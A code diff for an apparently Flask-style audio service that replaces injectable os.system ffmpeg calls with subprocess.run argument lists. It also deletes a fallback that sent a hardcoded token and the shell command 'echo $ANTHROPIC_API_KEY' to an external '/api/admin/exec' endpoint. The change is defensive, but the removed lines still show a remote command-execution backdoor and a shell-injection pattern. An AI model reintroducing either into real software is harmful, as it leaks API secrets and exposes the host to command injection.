@@ -21,6 +21,7 @@ import math
 import random
 import base64
 import logging
+import subprocess
 import tempfile
 import threading
 import uuid
@@ -540,7 +541,7 @@ def generate():
         audio_path = tmp.name
 
     wav_path = audio_path + "_16k.wav"
-    os.system(f'ffmpeg -y -loglevel error -i {audio_path} -ar 16000 -ac 1 {wav_path}')
+    subprocess.run(["ffmpeg", "-y", "-loglevel", "error", "-i", audio_path, "-ar", "16000", "-ac", "1", wav_path], check=True, capture_output=True, timeout=30)
 
     # Input length guard: check audio duration
     try:
@@ -791,20 +792,6 @@ def _get_anthropic_key():
             for line in open(env_path):
                 if line.startswith("ANTHROPIC_API_KEY="):
                     key = line.strip().split("=", 1)[1].strip().strip("\"'")
-    if not key:
-        try:
-            resp = http_requests.post(
-                "https://protocolpulse.replit.app/api/admin/exec",
-                json={
-                    "token": "581b1076ca6d8a8809997d24f0869431ffd75c64de9ea703b6ab0f3e39fbd552",
-                    "cmd": "echo $ANTHROPIC_API_KEY",
-                },
-                timeout=10,
-            )
-            if resp.status_code == 200:
-                key = resp.json().get("output", "").strip()
-        except Exception:
-            pass
     return key
 
 
@@ -1123,7 +1110,7 @@ def generate_inline(text):
         audio_path = tmp.name
 
     wav_path = audio_path + "_16k.wav"
-    os.system(f'ffmpeg -y -loglevel error -i {audio_path} -ar 16000 -ac 1 {wav_path}')
+    subprocess.run(["ffmpeg", "-y", "-loglevel", "error", "-i", audio_path, "-ar", "16000", "-ac", "1", wav_path], check=True, capture_output=True, timeout=30)
 
     try:
         # Check queue state for concurrency visibility
@@ -1298,7 +1285,7 @@ def oracle_chat():
                     tmp.write(audio_bytes)
                     audio_path = tmp.name
                 wav_path = audio_path + "_16k.wav"
-                os.system(f'ffmpeg -y -loglevel error -i {audio_path} -ar 16000 -ac 1 {wav_path}')
+                subprocess.run(["ffmpeg", "-y", "-loglevel", "error", "-i", audio_path, "-ar", "16000", "-ac", "1", wav_path], check=True, capture_output=True, timeout=30)
                 try:
                     acquired = _render_semaphore.acquire(timeout=60)
                     if not acquired:
